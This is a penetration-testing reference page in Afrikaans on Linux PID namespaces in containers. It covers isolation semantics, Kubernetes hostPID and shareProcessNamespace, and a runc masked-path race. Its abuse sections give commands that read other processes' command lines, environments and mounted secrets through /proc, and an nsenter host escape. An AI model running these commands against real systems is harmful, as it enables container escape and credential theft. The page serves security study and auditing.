# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID namespace beheer hoe prosesse genommer word en watter prosesse sigbaar is. Daarom kan 'n container sy eie PID 1 hê, al is dit nie 'n werklike masjien nie. Binne die namespace sien die workload wat soos 'n plaaslike prosesboom lyk. Buite die namespace sien die host steeds die werklike host-PIDs en die volledige proseslandskap.<sup>[[3]](#references)</sup>

Uit 'n security-oogpunt is die PID namespace belangrik omdat prosessigbaarheid waardevol is. Sodra 'n workload host-prosesse kan sien, kan dit moontlik diensname, command-line arguments, secrets wat in prosesarguments deurgegee word, omgewing-afgeleide state deur `/proc`, en potensiële namespace-entry-teikens waarneem. As dit meer kan doen as om slegs daardie prosesse te sien, byvoorbeeld deur signals te stuur of ptrace onder die regte voorwaardes te gebruik, word die probleem baie ernstiger.

## Werking

'n Nuwe PID namespace begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word vanuit die namespace se perspektief PID 1, wat ook beteken dat dit spesiale init-agtige semantiek vir wees-kinderprosesse en signal-gedrag kry. Dit verklaar baie van die container-afwykings rondom init-prosesse, zombie-reaping, en waarom klein init-wrappers soms in containers gebruik word.<sup>[[3]](#references)</sup>

PID namespaces vorm 'n hiërargie. 'n Proses in 'n voorouer-namespace kan afstammelinge adresseer deur die PID te gebruik wat in daardie voorouer toegeken is, maar 'n afstammeling kan nie voorouer-slegs-take deur gewone PID-gebaseerde syscalls adresseer of met `setns()` opwaarts na 'n voorouer-PID-namespace beweeg nie. 'n Voorouer-beheerde procfs wat doelbewus aan die afstammeling blootgestel word, kan steeds die voorouer se prosesweergawe lek. Om met `setns()` by 'n PID namespace aan te sluit, verander ook die namespace vir **toekomstige kinders**, nie die caller self nie; tools fork dus nadat hulle aangesluit het. 'n procfs-mount behou die PID-weergawe van die proses wat dit gemount het, en daarom is die skep van 'n vars procfs ná `unshare(CLONE_NEWPID)` security-relevant en nie slegs kosmeties nie.<sup>[[3]](#references)</sup>

Die belangrike security-les is dat 'n proses geïsoleerd kan lyk omdat dit slegs sy eie PID-boom sien, maar dat hierdie isolasie doelbewus verwyder kan word. Docker stel dit bloot deur `--pid=host`, terwyl Kubernetes dit deur `hostPID: true` doen. Sodra die container by die host se PID namespace aansluit, sien die workload host-prosesse direk, en baie latere attack paths word veel meer realisties.

## Lab

Om 'n PID namespace handmatig te skep:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou ’n private proses-aansig. Die `--mount-proc`-vlag is belangrik omdat dit ’n procfs-instansie monteer wat by die nuwe PID namespace pas, wat die proseslys van binne af samehangend maak.<sup>[[3]](#references)</sup>

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, en daarom is dit 'n goeie eerste lab vir lesers.

## Runtime Usage

Normale containers in Docker, Podman, containerd en CRI-O kry hul eie PID namespace. Kubernetes-containers het normaalweg afsonderlike PID-aansigte; `shareProcessNamespace: true` skep doelbewus een Pod-wye aansig.<sup>[[4]](#references)</sup> Daarteenoor kies `hostPID: true` die node se PID namespace. LXC/Incus-omgewings maak staat op dieselfde kernel-primitief, hoewel system-container-gebruiksgevalle meer ingewikkelde prosessbome kan blootstel en meer debugging-kortpaaie kan aanmoedig.

Dieselfde reël geld oral: indien die runtime gekies het om nie die PID namespace te isoleer nie, is dit 'n doelbewuste vermindering van die container-grens.

## Misconfigurations

Die kanonieke misconfiguration is host PID-sharing. Spanne regverdig dit dikwels vir debugging, monitoring of diensbestuur-gerief, maar dit moet altyd as 'n betekenisvolle sekuriteitsuitsondering behandel word. Selfs indien die container geen onmiddellike write primitive oor host-prosesse het nie, kan sigbaarheid alleen baie oor die stelsel openbaar. Sodra capabilities soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, brei die risiko aansienlik uit.

Nog 'n fout is om aan te neem dat host PID-sharing skadeloos is omdat die werklading nie by verstek host-prosesse kan kill of ptrace nie. Dié gevolgtrekking ignoreer die waarde van enumeration, die beskikbaarheid van namespace-entry-teikens, en die manier waarop PID-sigbaarheid met ander verswakte controls kombineer.

### Kubernetes Pod-wide process sharing

`shareProcessNamespace: true` verskil van `hostPID`: dit stel die prosesse van die **ander containers in dieselfde Pod** bloot, nie node-prosesse nie. 'n Compromised sidecar of debug-container kan dan sibling-command lines en omgewingsdata enumereer, onderhewig aan procfs-toegangskontroles, seine stuur wanneer credentials dit toelaat, en deur 'n sibling se filesystem navigeer via `/proc/<pid>/root`. Kubernetes waarsku uitdruklik dat command-line/environment-secrets en container-filesystems dan slegs deur die toepaslike Unix-permissions beskerm word.<sup>[[4]](#references)</sup>

Nuttige cluster-side review:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Vanuit 'n gekompromitteerde container in 'n Pod-wide PID namespace, toets eers werklike toegang eerder as om aan te neem dat sigbaarheid gelykstaande aan leesbaarheid is:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Misbruik

Indien die host se PID namespace gedeel word, kan ’n aanvaller host-prosesse inspekteer, prosesargumente versamel, interessante dienste identifiseer, kandidaat-PID’s vir `nsenter` opspoor, of prosessigbaarheid kombineer met ptrace-verwante privileges om met host- of naburige workloads in te meng. In sommige gevalle is dit genoeg om bloot die regte langlopende proses te sien om die res van die aanvalplan te hervorm.

Die eerste praktiese stap is altyd om te bevestig dat host-prosesse werklik sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host-PID's sigbaar is, word prosesargumente en namespace-entry-teikens dikwels die nuttigste inligtingsbron:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
As `nsenter` beskikbaar is en voldoende voorregte bestaan, toets of ’n sigbare gasheerproses as ’n naamruimtebrug gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer word, is host-PID-deling reeds waardevol omdat dit die diens-uitleg, runtime-komponente en moontlike bevoorregte prosesse onthul wat volgende geteiken kan word. PID-sigbaarheid alleen verleen **nie** toestemming om seine te stuur, te trace, sensitiewe `/proc/<pid>`-inskrywings te lees of by die teiken se ander namespaces aan te sluit nie; credentials, dumpability, capabilities in die teiken-namespace se besittende user namespace, Yama/LSM-beleid en seccomp is steeds belangrik.<sup>[[3]](#references)</sup> Sien [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) vir voorbeelde van process-injection.

Host-PID-sigbaarheid maak ook file-descriptor-misbruik meer realisties. As ’n bevoorregte host-proses of naburige workload ’n sensitiewe lêer of socket oop het, kan die aanvaller moontlik `/proc/<pid>/fd/` inspekteer en toegang tot die onderliggende objek verkry, afhangend van ptrace-styl-kontroles, eienaarskap, procfs-mount-opsies, die objektipe en die teikendiensmodel. Om bloot ’n FD-simboliese skakel te sien, beteken nie dat dit oopgemaak kan word nie, en ’n socket kan nie gedupliseer word bloot deur sy `/proc/<pid>/fd/N`-simboliese skakel oop te maak nie. Vir die afsonderlike `pidfd_getfd()`-primitive en sy magtigingskontroles, sien [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat hulle aandui of `hidepid=1` of `hidepid=2` kruis-proses-sigbaarheid verminder en of voor die hand liggende interessante descriptors, soos oop secret files, logs of Unix sockets, enigsins sigbaar is.

### Volledige voorbeeld: host PID + `nsenter`

Host PID sharing word ’n direkte host escape wanneer die proses ook genoeg privileges het om by die host namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
As die opdrag suksesvol is, voer die container-proses nou in die host se mount-, UTS-, network-, IPC- en PID-namespaces uit. Die impak is onmiddellike host-kompromittering.

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat deur die host binary bereik word indien die host filesystem gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Onlangse Runtime-aantekeninge

Sommige aanvalle wat met PID-namespace verband hou, is nie tradisionele `hostPID: true`-misconfigurations nie, maar runtime-implementasiefoute rondom hoe procfs-beskerming tydens container-opstelling toegepas word.

#### `maskedPaths`-race na host procfs

In kwesbare `runc`-weergawes kon aanvallers wat die container image of `runc exec`-workload kon beheer, die masking-fase omseil deur die container-kant se `/dev/null` te vervang met ’n symlink na ’n sensitiewe procfs-pad, soos `/proc/sys/kernel/core_pattern`. Indien die race geslaag het, kon die masked-path bind mount op die verkeerde target land en host-globale procfs-knobs aan die nuwe container blootstel.<sup>[[1]](#references)</sup>

Nuttige review command:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde as ’n direkte procfs-blootstelling kan wees: ’n skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur code execution op die host of denial of service. Die toegewyde bladsye oor [masked paths](../masked-paths.md) en [sensitive host mounts](../../sensitive-host-mounts.md) dek die algemene procfs-aanvalsoppervlak sonder om dit hier te dupliseer.

#### Namespace-inspuiting met `insject`

Namespace-inspuitingnutsgoed soos `insject` wys dat interaksie met ’n PID-namespace nie altyd vereis dat die teiken-namespace vooraf betree word voordat prosesskepping plaasvind nie. ’n Helper kan later aanheg, `setns()` gebruik en uitvoer terwyl sigbaarheid in die teiken-PID-spasie behou word:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik belangrik vir gevorderde debugging, offensive tooling en post-exploitation-workflows waar namespace-konteks aangesluit moet word nadat die runtime reeds die workload geïnisialiseer het.

### Verwante FD Abuse-patrone

Twee patrone verdien spesifiek vermelding wanneer host-PIDs sigbaar is. Eerstens kan ’n bevoorregte proses ’n sensitiewe file descriptor oop hou oor `execve()` heen omdat dit nie met `O_CLOEXEC` gemerk is nie. Tweedens kan services file descriptors deur Unix sockets deur middel van `SCM_RIGHTS` deurgee. In albei gevalle is die interessante objek nie meer die pathname nie, maar die reeds-oop handle wat ’n laer-bevoorregte proses kan erf of ontvang.

Dit is belangrik in container-werk omdat die handle na `docker.sock`, ’n bevoorregte log, ’n host secret file of ’n ander hoëwaarde-objek kan verwys, selfs wanneer die pad self nie direk vanaf die container-filesystem bereikbaar is nie.

## Kontroles

Die doel van hierdie commands is om te bepaal of die proses ’n private PID-view het en of dit reeds ’n veel breër proseslandskap kan enumerate.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Wat hier interessant is:<sup>[[3]](#references)</sup>

- As die proseslys ooglopende host services bevat, is host PID sharing waarskynlik reeds aktief.
- Om slegs ’n klein container-local tree te sien, is die normale baseline; om `systemd`, `dockerd` of onverwante daemons te sien, is dit nie.
- `NSpid` kan die PID-mapping oor geneste namespaces blootlê. Die linkerkantste waarde is relatief tot die PID namespace wat met die procfs-mount geassosieer word, gevolg deur waardes vir opeenvolgend geneste namespaces.
- `readlink /proc/self/ns/pid` alleen kan nie `hostPID` bewys nie: ’n geïsoleerde container het ook ’n geldige PID-namespace inode. Vergelyk dit met die proseslys, procfs-mount, runtime configuration en ’n host-side namespace inode wanneer beskikbaar.
- Sodra host PIDs sigbaar is, word selfs read-only process information nuttige reconnaissance.

As jy ’n container ontdek wat met host PID sharing loop, moenie dit as ’n kosmetiese verskil beskou nie. Dit is ’n groot verandering in wat die workload kan waarneem en moontlik beïnvloed.



## References

- [1] [runc security advisory: container escape via "masked path" abuse due to mount race conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: A Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 book](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Share Process Namespace between Containers in a Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
